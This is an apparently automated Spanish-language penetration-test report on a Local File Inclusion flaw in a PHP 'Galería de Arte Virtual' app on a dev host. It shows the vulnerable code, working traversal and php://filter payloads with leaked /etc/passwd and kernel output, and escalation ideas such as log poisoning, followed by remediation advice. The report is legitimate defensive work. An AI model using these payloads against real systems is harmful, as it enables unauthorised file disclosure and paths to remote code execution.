# Informe de Análisis de Seguridad - Local File Inclusion (LFI)

**Fecha:** 2026-04-30 15:47:28  
**Objetivo:** http://web.dev.local:8081  
**Tipo de Análisis:** Local File Inclusion (LFI)  
**Resultado:** ⚠️ VULNERABILIDAD ENCONTRADA Y EXPLOTADA

---

## 1. Resumen Ejecutivo

Se identificó y explotó con éxito una vulnerabilidad crítica de **Local File Inclusion (LFI)** en la aplicación web "Galería de Arte Virtual". La vulnerabilidad permite a un atacante leer archivos arbitrarios del sistema de ficheros del servidor, lo que puede derivar en divulgación de información sensible, lectura de código fuente y potencialmente ejecución remota de código (RCE).

---

## 2. Información del Objetivo

| Campo | Valor |
|-------|-------|
| URL | http://web.dev.local:8081 |
| Aplicación | Galería de Arte Virtual |
| Tecnología | PHP |
| Sistema Operativo | Linux (Ubuntu, kernel 6.8.0-110-generic) |

---

## 3. Vulnerabilidad Detectada

### 3.1 Descripción

**Tipo:** Local File Inclusion (LFI)  
**Severidad:** CRÍTICA  
**CVSS Score estimado:** 9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H)

El parámetro `page` del script `gallery.php` acepta input del usuario sin sanitización adecuada. Cuando el valor proporcionado contiene un punto (`.`), el código lo usa directamente como ruta de fichero para la función `include()` de PHP, permitiendo la inclusión de archivos arbitrarios del sistema mediante path traversal (`../`).

### 3.2 Código Vulnerable

```php
<?php
$page = $_GET['page'] ?? 'modern';

// Check if the page parameter contains file extension
if (strpos($page, '.') !== false) {
    // If it has an extension, use it as-is  ← VULNERABLE
    $file = $page;
} else {
    // Otherwise, assume it's a page in the pages directory
    $file = "pages/" . $page . ".php";
}

if (file_exists($file)) {
    include($file);
} else {
    echo "<div class='error'>...</div>";
    @include($file);  // ← También incluye si no existe (usando @)
}
?>
```

**Fallo:** La lógica detecta si el parámetro contiene un `.` y en ese caso usa el valor directamente como ruta de fichero, sin validar ni sanitizar la entrada. Esto permite inyectar secuencias `../` para navegar por el sistema de ficheros.

### 3.3 Endpoint Afectado

```
GET /gallery.php?page=<payload>
```

---

## 4. Explotación

### 4.1 Payloads Utilizados

#### Lectura de `/etc/passwd`
```
GET /gallery.php?page=../../../etc/passwd
```
**Resultado exitoso:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

#### Lectura de `/etc/hosts`
```
GET /gallery.php?page=../../../etc/hosts
```
**Resultado exitoso:**
```
127.0.0.1   localhost
::1         localhost ip6-localhost ip6-loopback
```

#### Lectura del código fuente PHP (PHP Filter Wrapper)
```
GET /gallery.php?page=php://filter/read=convert.base64-encode/resource=gallery.php
```
**Resultado:** Código fuente completo de `gallery.php` obtenido en base64 y decodificado.

#### Información del sistema operativo
```
GET /gallery.php?page=../../../proc/version
```
**Resultado:**
```
Linux version 6.8.0-110-generic (buildd@lcy02-amd64-115) 
(x86_64-linux-gnu-gcc-13 13.3.0) 
#110-Ubuntu SMP PREEMPT_DYNAMIC Thu Mar 19 15:09:20 UTC 2026
```

---

## 5. Impacto

| Impacto | Descripción |
|---------|-------------|
| **Confidencialidad** | ALTO — Lectura de archivos del sistema: `/etc/passwd`, código fuente PHP, configuraciones |
| **Integridad** | N/A — Solo lectura (no escritura mediante LFI básico) |
| **Disponibilidad** | MEDIO — Lectura de ficheros sensibles de configuración puede revelar vectores adicionales |

### Información sensible expuesta:
- Lista completa de usuarios del sistema (`/etc/passwd`)
- Versión del kernel y sistema operativo (`/proc/version`)
- Código fuente completo de la aplicación (PHP filter wrapper)
- Configuración de red (`/etc/hosts`)

---

## 6. Vectores de Ataque Adicionales

Con la vulnerabilidad LFI, un atacante podría escalar el ataque mediante:

1. **Log Poisoning:** Inyectar código PHP en logs de Apache/SSH y luego incluirlos vía LFI para lograr RCE.
2. **PHP Session Files:** Incluir ficheros de sesión (`/tmp/sess_*`) con payload PHP.
3. **PHP Wrappers adicionales:** `php://input`, `data://` para RCE directo si `allow_url_include` está activo.
4. **Lectura de `/etc/shadow`:** Si el proceso corre con privilegios suficientes, para obtener hashes de contraseñas.

---

## 7. Recomendaciones

### Corrección inmediata:

1. **Validar la entrada con lista blanca (whitelist):**
   ```php
   $allowed_pages = ['modern', 'classic', 'abstract', 'about'];
   $page = $_GET['page'] ?? 'modern';
   if (!in_array($page, $allowed_pages)) {
       $page = 'modern'; // Página por defecto
   }
   $file = "pages/" . $page . ".php";
   ```

2. **Eliminar la lógica de inclusión directa** cuando el parámetro contiene un punto.

3. **Nunca usar `include()` con input del usuario directamente**, ni siquiera con `@` para suprimir errores.

4. **Deshabilitar `allow_url_include`** en `php.ini` para prevenir RFI:
   ```ini
   allow_url_include = Off
   allow_url_fopen = Off
   ```

5. **Usar `realpath()` y verificar que la ruta esté dentro del directorio permitido:**
   ```php
   $base_dir = realpath(__DIR__ . '/pages/');
   $file = realpath($base_dir . '/' . $page . '.php');
   if (strpos($file, $base_dir) !== 0) {
       die('Acceso denegado');
   }
   ```

---

## 8. Conclusión

La aplicación web "Galería de Arte Virtual" presenta una vulnerabilidad crítica de LFI en el parámetro `page` del script `gallery.php`. La vulnerabilidad fue **confirmada y explotada**, permitiendo la lectura de ficheros del sistema como `/etc/passwd`, `/proc/version` y el propio código fuente de la aplicación. Se requiere corrección inmediata.

---

*Informe generado automáticamente por análisis de seguridad automatizado.*  
*Objetivo: http://web.dev.local:8081 | Fecha: 2026-04-30*
